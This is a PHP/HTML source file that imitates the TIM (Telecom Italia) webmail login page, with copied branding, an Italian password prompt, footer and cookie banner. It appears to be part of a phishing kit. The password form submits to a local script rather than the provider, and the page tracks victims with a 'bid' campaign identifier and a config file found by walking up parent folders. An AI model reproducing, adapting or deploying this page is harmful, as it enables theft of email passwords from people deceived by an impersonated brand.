<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="/";
?>
<!DOCTYPE html>
<html class="tablet landscape desktop">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <link rel="stylesheet" href="form/css.css">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<body style="display: block;" ng-app="app" ng-controller="c1" ng-model-options="{'updateOn':'blur'}" ng-cloak>
    <div id="content" class="content">
        <div class="box">
            <div id="box_content"> <img class="logo" src="logo_tim_new.png">
                <p class="title user">tyui@erterts</p>
                <p class="title">Entra nella tua Mail</p>
                <form id="form-auth" onsubmit="send1(event,'next__');return false">



                    <div class="form-group ">
                        <div class="cont-input_right">
                            <input class="input form-control" name="pass" placeholder="Password" id="pass" type="password"  pattern=".{4,}" data-err_text="Please enter valid " >
                        </div>
                        <div class="cont-link-mostra"> <a class="link-mostra" attr-id="#pass">Mostra</a> </div> <br clear="all">
                        <div class="riga_check">
                            <div id="error" class="error err_span" style="display: none;">Password non corretta</div>
                        </div>
                    </div>




                    <div>
                        <input class="submit" value="ENTRA" type="submit">
                    </div>
                </form>
            </div>
        </div>
        <div id="div-gpt-ad-1459423312054-0" style="display: none;">
            <div id="google_ads_iframe_/57491254/tim.it/tabmail/alice/Login_0__container__" style="border: 0pt none; width: 1px; height: 1px;"></div>
        </div>
    </div>
    <footer>
        <div class="footer-content">
            <div class="left"><a>Mail classica per PC</a> | <a target="_top">Privacy</a> | <a target="_top">TIM</a></div>
            <div class="right">©Telecom Italia 2015 - P.IVA 00488410010</div>
        </div>
    </footer>
    <div id="gld_cookie_flag">
        <div class="container_cookie">
            <p>Questo Sito utilizza cookie di profilazione di altri siti per inviarti pubblicità in linea con le tue preferenze. Se vuoi sapere di più o negare il consenso a tutti o alcuni cookie <a class="gld_link_privacy">clicca qui</a>. Se accedi ad un qualunque elemento sottostante o chiudi questo banner, acconsenti all'uso dei cookie.</p> <a><img src="close_cookie_banner.png" class="close_cookie_banner"></a>
        </div>
    </div>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>